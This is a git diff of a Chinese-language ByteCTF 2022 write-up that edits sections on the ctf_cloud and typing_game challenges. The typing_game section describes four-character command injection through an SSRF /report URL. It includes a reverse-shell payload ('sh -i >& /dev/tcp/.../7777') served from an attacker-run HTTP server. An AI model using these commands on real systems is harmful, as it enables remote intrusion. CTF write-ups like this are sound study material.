@@ -21,7 +21,7 @@ description: ByteCTF2022 第9名 打的还不错的一场比赛
 
 ![图 1](https://s2.loli.net/2022/09/26/xLNkUDGsPvyQZKf.png)  
 
-ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}
+`ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}`
 
 ## ctf_cloud
 > 改编自真实漏洞环境。在云计算日益发达的今天，许多云平台依靠其基础架构为用户提供云上开发功能，允许用户构建自己的应用，但这同样存在风险。
@@ -131,13 +131,19 @@ POST的参数
 
 因为这里不出网所以只能往网站目录下面写来访问。
 
+`ByteCTF{c98ecaae-4e6e-43da-a084-1f0d99034420}`
+
 ## typing_game
 
 ### 四字符命令注入弹Shell
+> 题目描述：
+我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏
 
 这个题目当时出的队伍不多只有11个，不过我的做法是非预期的，用的是四字符命令注入弹shell。
 
 通过`/report?url=<http://127.0.0.1:13002/status?cmd=ls`可以访问到/status接口并且执行4字符的命令。exp编写参考[HitconCTF2017 BabyFirst Revenge v2的exp](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2)。
+
+这里需要注意的是必须先`rm *`，因为`*>v`这个命令默认的顺序是按照文件名称的，那么如果没有删掉`index.js`这个文件，会导致reverse file "v" to file "x"之后，x文件里面的内容是`ls index.js -th`,这就很尴尬了。
 
 在服务器python3 -m http.server 8888起一个server并且放一个内容为sh -i >& /dev/tcp/xx.xxx.xxx.xxx/7777 0>&1,开启端口监听弹等shell弹过来就行。
 
@@ -208,10 +214,9 @@ sleep(35)
 
 ![图 2](https://s2.loli.net/2022/09/26/WBm5zSsNua3ifo2.png)  
 
-也许这也是出题人预期的一种吧不然为啥是四字符呢（，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。
+可能也许这也是出题人预期的一种吧不然为啥是四字符呢，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。
 
-### XSS带命令执行回显
+### XSS带出1命令执行回显
 等我复现完就来写（
-
 
 最近感觉题目复现的多了打比赛也没那么坐牢了，基本上都是有思路也能做出，就是熟练度的一些问题吧，继续加油。
